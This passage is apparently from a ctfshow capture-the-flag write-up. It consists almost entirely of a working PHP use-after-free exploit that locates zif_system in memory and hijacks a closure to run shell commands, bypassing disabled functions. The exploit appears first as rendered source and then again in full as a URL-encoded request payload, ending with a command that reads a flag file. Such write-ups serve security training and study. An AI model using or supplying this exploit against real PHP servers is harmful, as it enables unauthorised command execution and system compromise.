<span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params"><span class="variable">$base</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$e_type</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$e_phoff</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x20</span>);</span><br><span class="line">        <span class="variable">$e_phentsize</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable">$e_phnum</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$header</span> = <span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;</span><br><span class="line">            <span class="variable">$p_type</span>  = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_flags</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_vaddr</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x10</span>);</span><br><span class="line">            <span class="variable">$p_memsz</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">6</span>) &#123; </span><br><span class="line"></span><br><span class="line">                <span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == <span class="number">2</span> ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;</span><br><span class="line">                <span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">5</span>) &#123; </span><br><span class="line">                <span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$base</span>, <span class="variable">$elf</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>) = <span class="variable">$elf</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$data_size</span> / <span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, <span class="variable">$i</span> * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params"><span class="variable">$binary_leak</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$base</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$start</span> = <span class="variable">$binary_leak</span> &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x1000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$addr</span> = <span class="variable">$start</span> - <span class="number">0x1000</span> * <span class="variable">$i</span>;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> == <span class="number">0x10102464c457f</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$addr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="variable">$f_entry</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>);</span><br><span class="line">            <span class="variable">$f_name</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$f_entry</span>, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$f_name</span> == <span class="number">0x6d6574737973</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span> + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$addr</span> += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">trigger_uaf</span>(<span class="params"><span class="variable">$arg</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$arg</span> = <span class="title function_ invoke__">str_shuffle</span>(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line">        <span class="variable">$vuln</span> = <span class="keyword">new</span> <span class="title class_">Vuln</span>();</span><br><span class="line">        <span class="variable">$vuln</span>-&gt;a = <span class="variable">$arg</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$n_alloc</span> = <span class="number">10</span>; </span><br><span class="line">    <span class="variable">$contiguous</span> = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">        <span class="variable">$contiguous</span>[] = <span class="title function_ invoke__">str_shuffle</span>(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">trigger_uaf</span>(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line">    <span class="variable">$abc</span> = <span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$helper</span> = <span class="keyword">new</span> Helper;</span><br><span class="line">    <span class="variable">$helper</span>-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$x</span></span>) </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">79</span> || <span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_handlers</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$php_heap</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x58</span>);</span><br><span class="line">    <span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x10</span>, <span class="variable">$abc_addr</span> + <span class="number">0x60</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_obj</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$binary_leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_handlers</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$base</span> = <span class="title function_ invoke__">get_binary_base</span>(<span class="variable">$binary_leak</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$elf</span> = <span class="title function_ invoke__">parse_elf</span>(<span class="variable">$base</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$basic_funcs</span> = <span class="title function_ invoke__">get_basic_funcs</span>(<span class="variable">$base</span>, <span class="variable">$elf</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$zif_system</span> = <span class="title function_ invoke__">get_system</span>(<span class="variable">$basic_funcs</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="variable">$fake_obj_offset</span> = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x110</span>; <span class="variable">$i</span> += <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="variable">$fake_obj_offset</span> + <span class="variable">$i</span>, <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_obj</span>, <span class="variable">$i</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_obj_offset</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); </span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x68</span>, <span class="variable">$zif_system</span>); </span><br><span class="line"></span><br><span class="line">    (<span class="variable">$helper</span>-&gt;b)(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ctfshow</span>(<span class="string">&quot;cat /flag0.txt&quot;</span>);<span class="title function_ invoke__">ob_end_flush</span>();</span><br></pre></td></tr></table></figure><p>url编下码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=%0A%0Afunction%20ctfshow(%24cmd)%20%7B%0A%20%20%20%20global%20%24abc%2C%20%24helper%2C%20%24backtrace%3B%0A%0A%20%20%20%20class%20Vuln%20%7B%0A%20%20%20%20%20%20%20%20public%20%24a%3B%0A%20%20%20%20%20%20%20%20public%20function%20__destruct()%20%7B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20global%20%24backtrace%3B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20unset(%24this-%3Ea)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24backtrace%20%3D%20(new%20Exception)-%3EgetTrace()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(!isset(%24backtrace%5B1%5D%5B&#x27;args&#x27;%5D))%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24backtrace%20%3D%20debug_backtrace()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20class%20Helper%20%7B%0A%20%20%20%20%20%20%20%20public%20%24a%2C%20%24b%2C%20%24c%2C%20%24d%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20str2ptr(%26%24str%2C%20%24p%20%3D%200%2C%20%24s%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20%24address%20%3D%200%3B%0A%20%20%20%20%20%20%20%20for(%24j%20%3D%20%24s-1%3B%20%24j%20%3E%3D%200%3B%20%24j--)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24address%20%3C%3C%3D%208%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24address%20%7C%3D%20ord(%24str%5B%24p%2B%24j%5D)%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20return%20%24address%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20ptr2str(%24ptr%2C%20%24m%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20%24out%20%3D%20%22%22%3B%0A%20%20%20%20%20%20%20%20for%20(%24i%3D0%3B%20%24i%20%3C%20%24m%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24out%20.%3D%20sprintf(%22%25c%22%2C(%24ptr%20%26%200xff))%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24ptr%20%3E%3E%3D%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20return%20%24out%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20write(%26%24str%2C%20%24p%2C%20%24v%2C%20%24n%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20%24i%20%3D%200%3B%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24n%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24str%5B%24p%20%2B%20%24i%5D%20%3D%20sprintf(%22%25c%22%2C(%24v%20%26%200xff))%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24v%20%3E%3E%3D%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20leak(%24addr%2C%20%24p%20%3D%200%2C%20%24s%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20global%20%24abc%2C%20%24helper%3B%0A%20%20%20%20%20%20%20%20write(%24abc%2C%200x68%2C%20%24addr%20%2B%20%24p%20-%200x10)%3B%0A%20%20%20%20%20%20%20%20%24leak%20%3D%20strlen(%24helper-%3Ea)%3B%0A%20%20%20%20%20%20%20%20if(%24s%20!%3D%208)%20%7B%20%24leak%20%25%3D%202%20%3C%3C%20(%24s%20*%208)%20-%201%3B%20%7D%0A%20%20%20%20%20%20%20%20return%20%24leak%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20parse_elf(%24base)%20%7B%0A%20%20%20%20%20%20%20%20%24e_type%20%3D%20leak(%24base%2C%200x10%2C%202)%3B%0A%0A%20%20%20%20%20%20%20%20%24e_phoff%20%3D%20leak(%24base%2C%200x20)%3B%0A%20%20%20%20%20%20%20%20%24e_phentsize%20%3D%20leak(%24base%2C%200x36%2C%202)%3B%0A%20%20%20%20%20%20%20%20%24e_phnum%20%3D%20leak(%24base%2C%200x38%2C%202)%3B%0A%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24e_phnum%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24header%20%3D%20%24base%20%2B%20%24e_phoff%20%2B%20%24i%20*%20%24e_phentsize%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_type%20%20%3D%20leak(%24header%2C%200%2C%204)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_flags%20%3D%20leak(%24header%2C%204%2C%204)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_vaddr%20%3D%20leak(%24header%2C%200x10)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_memsz%20%3D%20leak(%24header%2C%200x28)%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24p_type%20%3D%3D%201%20%26%26%20%24p_flags%20%3D%3D%206)%20%7B%20%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24data_addr%20%3D%20%24e_type%20%3D%3D%202%20%3F%20%24p_vaddr%20%3A%20%24base%20%2B%20%24p_vaddr%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24data_size%20%3D%20%24p_memsz%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20if(%24p_type%20%3D%3D%201%20%26%26%20%24p_flags%20%3D%3D%205)%20%7B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24text_size%20%3D%20%24p_memsz%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20if(!%24data_addr%20%7C%7C%20!%24text_size%20%7C%7C%20!%24data_size)%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20false%3B%0A%0A%20%20%20%20%20%20%20%20return%20%5B%24data_addr%2C%20%24text_size%2C%20%24data_size%5D%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_basic_funcs(%24base%2C%20%24elf)%20%7B%0A%20%20%20%20%20%20%20%20list(%24data_addr%2C%20%24text_size%2C%20%24data_size)%20%3D%20%24elf%3B%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24data_size%20%2F%208%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24data_addr%2C%20%24i%20*%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20-%20%24base%20%3E%200%20%26%26%20%24leak%20-%20%24base%20%3C%20%24data_addr%20-%20%24base)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24deref%20%3D%20leak(%24leak)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24deref%20!%3D%200x746e6174736e6f63)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20continue%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20continue%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24data_addr%2C%20(%24i%20%2B%204)%20*%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20-%20%24base%20%3E%200%20%26%26%20%24leak%20-%20%24base%20%3C%20%24data_addr%20-%20%24base)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24deref%20%3D%20leak(%24leak)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24deref%20!%3D%200x786568326e6962)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20continue%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20continue%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20%24data_addr%20%2B%20%24i%20*%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_binary_base(%24binary_leak)%20%7B%0A%20%20%20%20%20%20%20%20%24base%20%3D%200%3B%0A%20%20%20%20%20%20%20%20%24start%20%3D%20%24binary_leak%20%26%200xfffffffffffff000%3B%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%200x1000%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24addr%20%3D%20%24start%20-%200x1000%20*%20%24i%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24addr%2C%200%2C%207)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20%3D%3D%200x10102464c457f)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20%24addr%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_system(%24basic_funcs)%20%7B%0A%20%20%20%20%20%20%20%20%24addr%20%3D%20%24basic_funcs%3B%0A%20%20%20%20%20%20%20%20do%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24f_entry%20%3D%20leak(%24addr)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24f_name%20%3D%20leak(%24f_entry%2C%200%2C%206)%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24f_name%20%3D%3D%200x6d6574737973)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20leak(%24addr%20%2B%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%24addr%20%2B%3D%200x20%3B%0A%20%20%20%20%20%20%20%20%7D%20while(%24f_entry%20!%3D%200)%3B%0A%20%20%20%20%20%20%20%20return%20false%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20trigger_uaf(%24arg)%20%7B%0A%0A%20%20%20%20%20%20%20%20%24arg%20%3D%20str_shuffle(&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;)%3B%0A%20%20%20%20%20%20%20%20%24vuln%20%3D%20new%20Vuln()%3B%0A%20%20%20%20%20%20%20%20%24vuln-%3Ea%20%3D%20%24arg%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(stristr(PHP_OS%2C%20&#x27;WIN&#x27;))%20%7B%0A%20%20%20%20%20%20%20%20die(&#x27;This%20PoC%20is%20for%20*nix%20systems%20only.&#x27;)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20%24n_alloc%20%3D%2010%3B%20%0A%20%20%20%20%24contiguous%20%3D%20%5B%5D%3B%0A%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24n_alloc%3B%20%24i%2B%2B)%0A%20%20%20%20%20%20%20%20%24contiguous%5B%5D%20%3D%20str_shuffle(&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;)%3B%0A%0A%20%20%20%20trigger_uaf(&#x27;x&#x27;)%3B%0A%20%20%20%20%24abc%20%3D%20%24backtrace%5B1%5D%5B&#x27;args&#x27;%5D%5B0%5D%3B%0A%0A%20%20%20%20%24helper%20%3D%20new%20Helper%3B%0A%20%20%20%20%24helper-%3Eb%20%3D%20function%20(%24x)%20%7B%20%7D%3B%0A%0A%20%20%20%20if(strlen(%24abc)%20%3D%3D%2079%20%7C%7C%20strlen(%24abc)%20%3D%3D%200)%20%7B%0A%20%20%20%20%20%20%20%20die(%22UAF%20failed%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20%24closure_handlers%20%3D%20str2ptr(%24abc%2C%200)%3B%0A%20%20%20%20%24php_heap%20%3D%20str2ptr(%24abc%2C%200x58)%3B%0A%20%20%20%20%24abc_addr%20%3D%20%24php_heap%20-%200xc8%3B%0A%0A%20%20%20%20write(%24abc%2C%200x60%2C%202)%3B%0A%20%20%20%20write(%24abc%2C%200x70%2C%206)%3B%0A%0A%20%20%20%20write(%24abc%2C%200x10%2C%20%24abc_addr%20%2B%200x60)%3B%0A%20%20%20%20write(%24abc%2C%200x18%2C%200xa)%3B%0A%0A%20%20%20%20%24closure_obj%20%3D%20str2ptr(%24abc%2C%200x20)%3B%0A%0A%20%20%20%20%24binary_leak%20%3D%20leak(%24closure_handlers%2C%208)%3B%0A%20%20%20%20if(!(%24base%20%3D%20get_binary_base(%24binary_leak)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#x27;t%20determine%20binary%20base%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24elf%20%3D%20parse_elf(%24base)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#x27;t%20parse%20ELF%20header%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24basic_funcs%20%3D%20get_basic_funcs(%24base%2C%20%24elf)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#x27;t%20get%20basic_functions%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24zif_system%20%3D%20get_system(%24basic_funcs)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#x27;t%20get%20zif_system%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%0A%20%20%20%20%24fake_obj_offset%20%3D%200xd0%3B%0A%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%200x110%3B%20%24i%20%2B%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20write(%24abc%2C%20%24fake_obj_offset%20%2B%20%24i%2C%20leak(%24closure_obj%2C%20%24i))%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20write(%24abc%2C%200x20%2C%20%24abc_addr%20%2B%20%24fake_obj_offset)%3B%0A%20%20%20%20write(%24abc%2C%200xd0%20%2B%200x38%2C%201%2C%204)%3B%20%0A%20%20%20%20write(%24abc%2C%200xd0%20%2B%200x68%2C%20%24zif_system)%3B%20%0A%0A%20%20%20%20(%24helper-%3Eb)(%24cmd)%3B%0A%20%20%20%20exit()%3B%0A%7D%0A%0Actfshow(%22cat%20%2Fflag0.txt%22)%3Bob_end_flush()%3B</span><br></p